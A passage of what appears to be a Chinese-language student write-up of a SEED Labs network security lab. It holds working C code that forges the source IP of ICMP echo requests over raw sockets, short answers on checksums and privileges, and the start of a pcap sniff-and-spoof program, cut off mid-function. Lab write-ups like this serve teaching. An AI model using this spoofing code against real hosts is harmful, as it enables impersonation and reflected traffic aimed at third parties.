<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> nbytes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">register</span> <span class="token keyword">long</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> oddbyte<span class="token punctuation">;</span>
    <span class="token keyword">register</span> <span class="token keyword">short</span> answer<span class="token punctuation">;</span>

    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>nbytes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> <span class="token operator">*</span>ptr<span class="token operator">++</span><span class="token punctuation">;</span>
        nbytes <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nbytes <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oddbyte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oddbyte<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> oddbyte<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sum <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    answer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">~</span>sum<span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> answer<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Function to send spoofed ICMP echo request</span>
<span class="token keyword">void</span> <span class="token function">send_spoofed_icmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>spoofed_source<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>destination<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> sd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> sin<span class="token punctuation">;</span>
    <span class="token keyword">char</span> packet<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Create raw socket</span>
    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_RAW<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Enable IP_HDRINCL to manually construct IP header</span>
    <span class="token keyword">int</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span>val <span class="token operator">=</span> <span class="token operator">&amp;</span>one<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> IPPROTO_IP<span class="token punctuation">,</span> IP_HDRINCL<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"setsockopt() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Set destination address</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>destination<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Clear packet buffer</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Construct IP Header =====</span>
    <span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span>ip_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span><span class="token punctuation">)</span>packet<span class="token punctuation">;</span>
    
    ip_hdr<span class="token operator">-></span>ip_v <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>                       <span class="token comment">// IPv4</span>
    ip_hdr<span class="token operator">-></span>ip_hl <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>                      <span class="token comment">// Header length (5 * 4 = 20 bytes)</span>
    ip_hdr<span class="token operator">-></span>ip_tos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Type of service</span>
    ip_hdr<span class="token operator">-></span>ip_len <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Total length</span>
    ip_hdr<span class="token operator">-></span>ip_id <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">54321</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// Identification</span>
    ip_hdr<span class="token operator">-></span>ip_off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Fragment offset</span>
    ip_hdr<span class="token operator">-></span>ip_ttl <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>                    <span class="token comment">// Time to live</span>
    ip_hdr<span class="token operator">-></span>ip_p <span class="token operator">=</span> IPPROTO_ICMP<span class="token punctuation">;</span>            <span class="token comment">// ICMP protocol</span>
    ip_hdr<span class="token operator">-></span>ip_sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Checksum (calculate later)</span>
    ip_hdr<span class="token operator">-></span>ip_src<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>spoofed_source<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// SPOOFED source IP</span>
    ip_hdr<span class="token operator">-></span>ip_dst<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>        <span class="token comment">// Destination IP</span>
    
    <span class="token comment">// Calculate IP header checksum</span>
    ip_hdr<span class="token operator">-></span>ip_sum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>ip_hdr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Construct ICMP Header =====</span>
    <span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span>icmp_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    icmp_hdr<span class="token operator">-></span>type <span class="token operator">=</span> ICMP_ECHO<span class="token punctuation">;</span>             <span class="token comment">// ICMP Echo Request</span>
    icmp_hdr<span class="token operator">-></span>code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Code 0 for echo request</span>
    icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Identifier (use process ID)</span>
    icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Sequence number</span>
    icmp_hdr<span class="token operator">-></span>checksum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                 <span class="token comment">// Will calculate after adding data</span>
    
    <span class="token comment">// ===== Add some data to ICMP packet =====</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">timeval</span> tv<span class="token punctuation">;</span>
    <span class="token function">gettimeofday</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// Add timestamp as data</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>tv<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Hello from spoofed ICMP!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Additional data</span>
    
    <span class="token comment">// Calculate ICMP checksum (header + data)</span>
    <span class="token keyword">int</span> icmp_total_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"Hello from spoofed ICMP!"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    icmp_hdr<span class="token operator">-></span>checksum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Reset before calculation</span>
    icmp_hdr<span class="token operator">-></span>checksum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>icmp_hdr<span class="token punctuation">,</span> icmp_total_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Send the spoofed packet =====</span>
    <span class="token keyword">int</span> packet_len <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>ip_hdr<span class="token operator">-></span>ip_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> packet_len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"sendto() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spoofed ICMP Echo Request sent successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spoofed Source IP: %s\n"</span><span class="token punctuation">,</span> spoofed_source<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Destination IP: %s\n"</span><span class="token punctuation">,</span> destination<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ICMP Type: Echo Request (8)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ICMP ID: %d\n"</span><span class="token punctuation">,</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ICMP Sequence: %d\n"</span><span class="token punctuation">,</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Total packet length: %d bytes\n"</span><span class="token punctuation">,</span> packet_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &lt;spoofed_source_ip> &lt;destination_ip>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Example: %s 8.8.8.8 93.184.216.34\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This will send an ICMP echo request to 93.184.216.34 (example.com)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"appearing to come from 8.8.8.8 (Google DNS)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>spoofed_source <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>destination <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Starting ICMP Echo Request Spoofing...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=====================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Validate IP addresses</span>
    <span class="token keyword">struct</span> <span class="token class-name">in_addr</span> addr<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> spoofed_source<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid spoofed source IP address\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> destination<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error: Invalid destination IP address\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">send_spoofed_icmp</span><span class="token punctuation">(</span>spoofed_source<span class="token punctuation">,</span> destination<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2025/11/12/seedlab6/image-20251117235952591.png" alt="image-20251117235952591"></p>
<p>可以看见我们伪造的报文发送成功，但是报文在通过主虚机时，源地址会被转换。因为网络问题，该ICMP报文并没有得到答复。</p>
<p><img src="/2025/11/12/seedlab6/image-20251118000040685.png" alt="image-20251118000040685"></p>
<p><strong>Q4</strong></p>
<p>确实可以随机设置IP报文头中的报文长度参数，但必须保证向socket发送的原始报文是正确的长度，这样当下一条进行转发时会将错误的长度进行修正（即根据我们现有的报文写一个新的发送出去）。如果长度参数与我们发送的大小一致，则可能发送出去报文之后检验和不匹配，无法收到回显报文</p>
<p><strong>Q5</strong></p>
<p>是的，必须计算检验和，否则默认填写0x00，在终点服务器会检验不通过直接丢弃该报文。</p>
<p><strong>Q6</strong></p>
<p>类似2.1A中Q2的回答，不允许无权限的用户执行发送&amp;接收报文的操作。</p>
<h2 id="Task-2-3-Sniff-and-then-Spoof"><a href="#Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="Task 2.3: Sniff and then Spoof"></a>Task 2.3: Sniff and then Spoof</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip_icmp.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pcap.h></span></span>

<span class="token keyword">volatile</span> <span class="token class-name">sig_atomic_t</span> stop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">handle_signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    stop <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nStopping sniff-and-spoof program...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Calculate checksum function</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> nbytes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">register</span> <span class="token keyword">long</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> oddbyte<span class="token punctuation">;</span>
    <span class="token keyword">register</span> <span class="token keyword">short</span> answer<span class="token punctuation">;</span>

    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>nbytes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> <span class="token operator">*</span>ptr<span class="token operator">++</span><span class="token punctuation">;</span>
        nbytes <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nbytes <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oddbyte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oddbyte<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> oddbyte<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sum <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    answer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">~</span>sum<span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> answer<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Function to send spoofed ICMP echo reply</span>
<span class="token keyword">void</span> <span class="token function">send_spoofed_reply</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span>ip_hdr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span>icmp_req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> sd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> sin<span class="token punctuation">;</span>
    <span class="token keyword">char</span> packet<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Create raw socket for sending</span>
    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_RAW<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket() error for sender"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
